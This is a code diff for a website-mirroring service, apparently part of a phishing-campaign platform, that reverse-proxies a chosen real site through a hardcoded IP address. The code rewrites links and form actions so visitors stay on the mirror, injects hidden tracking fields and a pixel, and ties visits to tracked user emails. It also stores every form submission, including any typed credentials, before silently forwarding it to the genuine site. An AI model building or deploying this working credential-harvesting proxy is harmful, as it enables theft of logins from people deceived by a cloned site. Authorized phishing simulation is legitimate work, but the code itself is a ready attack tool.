@@ -1,14 +1,12 @@
 const axios = require('axios');
 const cheerio = require('cheerio');
-const express = require('express');
-const { createProxyMiddleware } = require('http-proxy-middleware');
 const db = require('../database');
 const crypto = require('crypto');
 
 class WebsiteMirroringService {
   constructor() {
-    this.activeSessions = new Map();
-    this.proxyServers = new Map();
+    this.activeSessions = new Map(); // sessionToken -> session data
+    this.mirrorRoutes = new Map(); // path -> session data
   }
 
   /**
@@ -19,8 +17,8 @@ class WebsiteMirroringService {
    */
   async createMirrorSession(campaignId, targetUrl) {
     try {
-      // Find an available port (starting from 8080)
-      const proxyPort = await this.findAvailablePort(8080);
+      // Generate unique session token (like iksduhfgh_7898dmndfikd)
+      const sessionToken = crypto.randomBytes(16).toString('hex');
       
       // Normalize target URL
       const normalizedUrl = this.normalizeUrl(targetUrl);
@@ -29,9 +27,9 @@ class WebsiteMirroringService {
       const sessionId = await new Promise((resolve, reject) => {
         db.run(
           `INSERT INTO WebsiteMirroringSessions 
-           (campaign_id, target_url, proxy_port, status) 
+           (campaign_id, target_url, session_token, status) 
            VALUES (?, ?, ?, ?)`,
-          [campaignId, normalizedUrl, proxyPort, 'active'],
+          [campaignId, normalizedUrl, sessionToken, 'active'],
           function(err) {
             if (err) reject(err);
             else resolve(this.lastID);
@@ -39,25 +37,30 @@ class WebsiteMirroringService {
         );
       });
 
-      // Start proxy server
-      const proxyUrl = await this.startProxyServer(sessionId, normalizedUrl, proxyPort);
+      // Create proxy URL using path-based routing on port 5000
+      const proxyUrl = `http://147.93.87.182:5000/${sessionToken}`;
       
       // Store session info
-      this.activeSessions.set(sessionId, {
+      const sessionData = {
+        sessionId,
         campaignId,
         targetUrl: normalizedUrl,
-        proxyPort,
+        sessionToken,
         proxyUrl,
         startTime: new Date()
-      });
+      };
+      
+      this.activeSessions.set(sessionToken, sessionData);
+      this.mirrorRoutes.set(`/${sessionToken}`, sessionData);
 
       console.log(`Website mirroring session created: ${proxyUrl} -> ${normalizedUrl}`);
       
       return {
         sessionId,
+        sessionToken,
         proxyUrl,
         targetUrl: normalizedUrl,
-        proxyPort
+        proxyPort: 5000 // Always use port 5000
       };
     } catch (error) {
       console.error('Error creating mirror session:', error);
@@ -66,101 +69,231 @@ class WebsiteMirroringService {
   }
 
   /**
-   * Start a proxy server for website mirroring
-   * @param {number} sessionId - Session ID
-   * @param {string} targetUrl - Target URL to mirror
-   * @param {number} port - Port to run proxy on
-   * @returns {Promise<string>} Proxy URL
+   * Handle mirroring request for a specific session
+   * @param {string} sessionToken - The session token from URL path
+   * @param {object} req - Express request object
+   * @param {object} res - Express response object
    */
-  async startProxyServer(sessionId, targetUrl, port) {
-    const app = express();
-    
-    // Middleware to track access
-    app.use((req, res, next) => {
-      this.trackAccess(sessionId, req);
-      next();
-    });
-
-    // Create proxy middleware with content modification
-    const proxyMiddleware = createProxyMiddleware({
-      target: targetUrl,
-      changeOrigin: true,
-      followRedirects: true,
-      selfHandleResponse: true,
-      onProxyRes: (proxyRes, req, res) => {
-        this.handleProxyResponse(proxyRes, req, res, sessionId, targetUrl);
-      },
-      onError: (err, req, res) => {
-        console.error('Proxy error:', err);
-        res.status(500).send('Mirroring service temporarily unavailable');
+  async handleMirrorRequest(sessionToken, req, res) {
+    try {
+      const session = this.activeSessions.get(sessionToken);
+      
+      if (!session) {
+        // Session not in memory, try to load it from database
+        const dbSession = await new Promise((resolve, reject) => {
+          db.get(
+            `SELECT * FROM WebsiteMirroringSessions 
+             WHERE session_token = ? AND status = 'active'`,
+            [sessionToken],
+            (err, row) => {
+              if (err) reject(err);
+              else resolve(row);
+            }
+          );
+        });
+        
+        if (dbSession) {
+          // Create session in memory
+          this.activeSessions.set(sessionToken, {
+            sessionId: dbSession.id,
+            campaignId: dbSession.campaign_id,
+            targetUrl: dbSession.target_url,
+            sessionToken,
+            proxyUrl: `http://147.93.87.182:5000/${sessionToken}`,
+            startTime: new Date(dbSession.created_at)
+          });
+          
+          // Use newly created session
+          return this.handleMirrorRequest(sessionToken, req, res);
+        }
+        
+        return res.status(404).send('Mirror session not found or expired');
       }
-    });
 
-    app.use('/', proxyMiddleware);
+      // Track the access
+      await this.trackAccess(session.sessionId, req);
 
-    // Start server
-    const server = app.listen(port, () => {
-      console.log(`Proxy server running on port ${port} for session ${sessionId}`);
-    });
+      // Get the target URL
+      const targetUrl = session.targetUrl;
+      let requestPath = req.path.replace(`/${sessionToken}`, '') || '/';
+      const queryString = req.url.includes('?') ? req.url.split('?')[1] : '';
+      
+      // Remove tracking parameters from forwarded request
+      let cleanQuery = '';
+      if (queryString) {
+        const params = new URLSearchParams(queryString);
+        params.delete('_fstrike_track');
+        cleanQuery = params.toString();
+      }
+      
+      // Build full target URL
+      let fullTargetUrl = targetUrl + requestPath;
+      if (cleanQuery) {
+        fullTargetUrl += '?' + cleanQuery;
+      }
 
-    // Store server reference
-    this.proxyServers.set(sessionId, server);
+      console.log(`Mirroring request: ${req.method} ${req.originalUrl} -> ${fullTargetUrl}`);
 
-    // Return the proxy URL (using the main server's domain)
-    return `http://147.93.87.182:${port}`;
+      // Handle form submissions
+      if (req.method === 'POST') {
+        return this.handleFormSubmission(session, req, res, fullTargetUrl);
+      }
+
+      // Make request to target website
+      const response = await axios({
+        method: req.method,
+        url: fullTargetUrl,
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+          'Accept': req.headers.accept || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+          'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.5',
+          'Accept-Encoding': 'gzip, deflate',
+          'DNT': '1',
+          'Connection': 'keep-alive',
+          'Upgrade-Insecure-Requests': '1'
+        },
+        responseType: 'arraybuffer',
+        maxRedirects: 5,
+        timeout: 15000,
+        decompress: true
+      });
+
+      // Set response headers
+      Object.keys(response.headers).forEach(key => {
+        if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key.toLowerCase())) {
+          res.setHeader(key, response.headers[key]);
+        }
+      });
+
+      res.status(response.status);
+
+      // Modify HTML content if it's HTML
+      const contentType = response.headers['content-type'] || '';
+      if (contentType.includes('text/html')) {
+        const html = response.data.toString('utf-8');
+        const modifiedHtml = this.modifyHtmlContent(html, sessionToken, targetUrl, req);
+        res.send(modifiedHtml);
+      } else {
+        res.send(response.data);
+      }
+
+    } catch (error) {
+      console.error('Error handling mirror request:', error);
+      if (error.response) {
+        res.status(error.response.status).send(`Error loading content: ${error.response.statusText}`);
+      } else {
+        res.status(500).send('Error loading mirrored content');
+      }
+    }
   }
 
   /**
-   * Handle proxy response and modify content if needed
+   * Handle form submission to mirrored website
    */
-  handleProxyResponse(proxyRes, req, res, sessionId, targetUrl) {
-    let body = '';
-    
-    proxyRes.on('data', (chunk) => {
-      body += chunk;
-    });
+  async handleFormSubmission(session, req, res, targetUrl) {
+    try {
+      console.log('Form submission to mirrored website:', req.body);
 
-    proxyRes.on('end', () => {
-      const contentType = proxyRes.headers['content-type'] || '';
-      
-      // Copy headers
-      Object.keys(proxyRes.headers).forEach(key => {
-        res.setHeader(key, proxyRes.headers[key]);
+      // Store form submission in our database
+      const formData = { ...req.body };
+      delete formData._fstrike_session; // Remove our tracking field
+
+      // Store in database
+      db.run(
+        `INSERT INTO FormSubmissions (campaign_id, landing_page_id, form_data, ip_address, user_agent)
+         VALUES (?, ?, ?, ?, ?)`,
+        [session.campaignId, 0, JSON.stringify(formData), req.ip, req.get('User-Agent')]
+      );
+
+      console.log('Form data captured for campaign:', session.campaignId);
+
+      // Forward form submission to target website
+      const response = await axios({
+        method: 'POST',
+        url: targetUrl,
+        data: new URLSearchParams(formData),
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+          'Accept-Language': 'en-US,en;q=0.5',
+          'Referer': session.targetUrl,
+          'Origin': new URL(session.targetUrl).origin
+        },
+        maxRedirects: 0,
+        validateStatus: () => true,
+        responseType: 'arraybuffer',
+        timeout: 15000
       });
 
-      res.statusCode = proxyRes.statusCode;
-
-      // Modify HTML content to inject tracking and fix links
-      if (contentType.includes('text/html')) {
-        const modifiedHtml = this.modifyHtmlContent(body, sessionId, targetUrl, req);
-        res.end(modifiedHtml);
-      } else {
-        res.end(body);
+      // Handle redirects
+      if (response.status >= 300 && response.status < 400 && response.headers.location) {
+        const redirectUrl = response.headers.location;
+        if (redirectUrl.startsWith('http')) {
+          // Absolute redirect - check if it's to the same domain
+          const redirectDomain = new URL(redirectUrl).origin;
+          if (redirectDomain === new URL(session.targetUrl).origin) {
+            // Same domain - redirect through our proxy
+            const relativePath = redirectUrl.replace(session.targetUrl, '');
+            return res.redirect(response.status, `/${session.sessionToken}${relativePath}`);
+          }
+        } else {
+          // Relative redirect - redirect through our proxy
+          return res.redirect(response.status, `/${session.sessionToken}${redirectUrl}`);
+        }
       }
-    });
+
+      // Return response
+      res.status(response.status);
+      Object.keys(response.headers).forEach(key => {
+        if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key.toLowerCase())) {
+          res.setHeader(key, response.headers[key]);
+        }
+      });
+
+      if (response.headers['content-type']?.includes('text/html')) {
+        const html = response.data.toString('utf-8');
+        const modifiedHtml = this.modifyHtmlContent(html, session.sessionToken, session.targetUrl, req);
+        res.send(modifiedHtml);
+      } else {
+        res.send(response.data);
+      }
+
+    } catch (error) {
+      console.error('Error handling form submission:', error);
+      res.status(500).send('Error submitting form');
+    }
   }
 
   /**
    * Modify HTML content to inject tracking and fix relative links
    */
-  modifyHtmlContent(html, sessionId, targetUrl, req) {
+  modifyHtmlContent(html, sessionToken, targetUrl, req) {
     try {
       const $ = cheerio.load(html);
-      const session = this.activeSessions.get(sessionId);
-      
-      if (!session) return html;
-
-      const proxyUrl = session.proxyUrl;
       const baseUrl = new URL(targetUrl);
+      const proxyPath = `/${sessionToken}`;
 
       // Fix relative links and resources
       $('a[href]').each((i, elem) => {
         const href = $(elem).attr('href');
-        if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
-          const absoluteUrl = this.resolveUrl(href, baseUrl);
-          if (absoluteUrl.origin === baseUrl.origin) {
-            // Internal link - route through proxy
-            $(elem).attr('href', absoluteUrl.pathname + absoluteUrl.search + absoluteUrl.hash);
+        if (href && !href.startsWith('#') && !href.startsWith('javascript:') && !href.startsWith('mailto:')) {
+          if (href.startsWith('http')) {
+            // Absolute URL - check if same domain
+            try {
+              const linkUrl = new URL(href);
+              if (linkUrl.origin === baseUrl.origin) {
+                // Same domain - route through proxy
+                const relativePath = href.replace(baseUrl.origin, '');
+                $(elem).attr('href', proxyPath + relativePath);
+              }
+            } catch (e) {
+              // Invalid URL, keep original
+            }
+          } else {
+            // Relative URL - route through proxy
+            const absolutePath = href.startsWith('/') ? href : '/' + href;
+            $(elem).attr('href', proxyPath + absolutePath);
           }
         }
       });
@@ -168,38 +301,57 @@ class WebsiteMirroringService {
       // Fix images, CSS, and JS resources
       $('img[src], link[href], script[src]').each((i, elem) => {
         const attr = $(elem).attr('src') || $(elem).attr('href');
-        if (attr && !attr.startsWith('http') && !attr.startsWith('//')) {
-          const absoluteUrl = this.resolveUrl(attr, baseUrl);
-          if (absoluteUrl.origin === baseUrl.origin) {
-            if ($(elem).attr('src')) {
-              $(elem).attr('src', absoluteUrl.pathname + absoluteUrl.search);
-            } else {
-              $(elem).attr('href', absoluteUrl.pathname + absoluteUrl.search);
-            }
+        if (attr && !attr.startsWith('http') && !attr.startsWith('//') && !attr.startsWith('data:')) {
+          const absolutePath = attr.startsWith('/') ? attr : '/' + attr;
+          if ($(elem).attr('src')) {
+            $(elem).attr('src', proxyPath + absolutePath);
+          } else {
+            $(elem).attr('href', proxyPath + absolutePath);
+          }
+        } else if (attr && attr.startsWith('//')) {
+          // Protocol-relative URLs
+          if ($(elem).attr('src')) {
+            $(elem).attr('src', 'https:' + attr);
+          } else {
+            $(elem).attr('href', 'https:' + attr);
           }
         }
       });
 
-      // Inject form submission tracking
+      // Fix form actions
       $('form').each((i, elem) => {
         const $form = $(elem);
-        const originalAction = $form.attr('action') || '';
+        const action = $form.attr('action');
         
         // Add hidden field to track form submissions
-        $form.append(`<input type="hidden" name="_fstrike_session" value="${sessionId}">`);
+        $form.append(`<input type="hidden" name="_fstrike_session" value="${sessionToken}">`);
         
-        // Modify form action if it's a relative URL
-        if (originalAction && !originalAction.startsWith('http')) {
-          const absoluteUrl = this.resolveUrl(originalAction, baseUrl);
-          if (absoluteUrl.origin === baseUrl.origin) {
-            $form.attr('action', absoluteUrl.pathname + absoluteUrl.search);
+        if (action) {
+          if (action.startsWith('http')) {
+            // Absolute URL - check if same domain
+            try {
+              const actionUrl = new URL(action);
+              if (actionUrl.origin === baseUrl.origin) {
+                const relativePath = action.replace(baseUrl.origin, '');
+                $form.attr('action', proxyPath + relativePath);
+              }
+            } catch (e) {
+              // Invalid URL, keep original
+            }
+          } else if (!action.startsWith('javascript:')) {
+            // Relative URL - route through proxy
+            const absolutePath = action.startsWith('/') ? action : '/' + action;
+            $form.attr('action', proxyPath + absolutePath);
           }
+        } else {
+          // No action - defaults to current page
+          $form.attr('action', req.originalUrl);
         }
       });
 
       // Inject tracking pixel for page views
       const trackingPixel = `
-        <img src="/api/track-mirror-view/${sessionId}" 
+        <img src="/api/track-mirror-view/${sessionToken}" 
              style="display:none;width:1px;height:1px;" 
              alt="" />
       `;
@@ -220,6 +372,7 @@ class WebsiteMirroringService {
       const timestamp = new Date().toISOString();
       const ip = req.ip || req.connection.remoteAddress;
       const userAgent = req.get('User-Agent') || '';
+      const trackingParam = req.query._fstrike_track;
 
       // Update last accessed time and increment counter
       db.run(
@@ -229,7 +382,30 @@ class WebsiteMirroringService {
         [timestamp, sessionId]
       );
 
-      console.log(`Mirror access tracked: Session ${sessionId}, IP: ${ip}, Path: ${req.path}`);
+      // Log visit with tracking ID if present
+      if (trackingParam) {
+        console.log(`Mirror access tracked with ID ${trackingParam}: Session ${sessionId}, IP: ${ip}`);
+        
+        // Check if this corresponds to a tracking pixel
+        db.get(
+          `SELECT user_email FROM tracking_pixels WHERE id = ?`,
+          [trackingParam],
+          (err, row) => {
+            if (!err && row) {
+              console.log(`Mirror access by user: ${row.user_email}`);
+              
+              // Log the click in link_clicks table
+              db.run(
+                `INSERT INTO link_clicks (campaign_id, landing_page_id, ip_address, user_agent)
+                 VALUES (?, 0, ?, ?)`,
+                [sessionId, ip, userAgent]
+              );
+            }
+          }
+        );
+      } else {
+        console.log(`Mirror access tracked: Session ${sessionId}, IP: ${ip}, Path: ${req.path}`);
+      }
     } catch (error) {
       console.error('Error tracking access:', error);
     }
@@ -240,15 +416,20 @@ class WebsiteMirroringService {
    */
   async stopMirrorSession(sessionId) {
     try {
-      // Stop proxy server
-      const server = this.proxyServers.get(sessionId);
-      if (server) {
-        server.close();
-        this.proxyServers.delete(sessionId);
+      // Find session by ID
+      let sessionToken = null;
+      for (const [token, session] of this.activeSessions.entries()) {
+        if (session.sessionId === sessionId) {
+          sessionToken = token;
+          break;
+        }
       }
 
-      // Remove from active sessions
-      this.activeSessions.delete(sessionId);
+      if (sessionToken) {
+        // Remove from active sessions
+        this.activeSessions.delete(sessionToken);
+        this.mirrorRoutes.delete(`/${sessionToken}`);
+      }
 
       // Update database
       await new Promise((resolve, reject) => {
@@ -297,37 +478,6 @@ class WebsiteMirroringService {
       url = 'https://' + url;
     }
     return url.endsWith('/') ? url.slice(0, -1) : url;
-  }
-
-  resolveUrl(url, baseUrl) {
-    try {
-      return new URL(url, baseUrl.href);
-    } catch {
-      return baseUrl;
-    }
-  }
-
-  async findAvailablePort(startPort) {
-    const net = require('net');
-    
-    const isPortAvailable = (port) => {
-      return new Promise((resolve) => {
-        const server = net.createServer();
-        server.listen(port, () => {
-          server.close(() => resolve(true));
-        });
-        server.on('error', () => resolve(false));
-      });
-    };
-
-    let port = startPort;
-    while (!(await isPortAvailable(port))) {
-      port++;
-      if (port > startPort + 100) {
-        throw new Error('No available ports found');
-      }
-    }
-    return port;
   }
 
   /**
